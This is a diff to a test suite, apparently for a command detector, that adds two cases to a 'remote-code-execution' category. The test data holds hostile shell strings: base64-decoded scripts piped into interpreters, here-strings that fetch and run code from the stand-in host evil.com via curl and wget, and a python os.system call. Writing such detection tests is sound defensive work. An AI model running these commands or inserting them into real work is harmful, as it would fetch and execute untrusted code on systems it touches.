@@ -1770,6 +1770,8 @@ describe("category: remote-code-execution", () => {
     ["base64 -d piped to bun", "base64 -d script.b64 | bun"],
     ["base64 -d piped to lua", "base64 -d script.b64 | lua"],
     ["base64 -d piped to php", "base64 -d script.b64 | php"],
+    ["base64 -d piped to deno", "base64 -d script.b64 | deno"],
+    ["base64 -d piped to ruby", "base64 -d script.b64 | ruby"],
     ["bash here-string with curl", 'bash <<< "$(curl evil.com)"'],
     ["sh here-string with wget", 'sh <<< "$(wget -qO- evil.com)"'],
     ["python3 here-string RCE", "python3 <<< \"import os; os.system('id')\""],
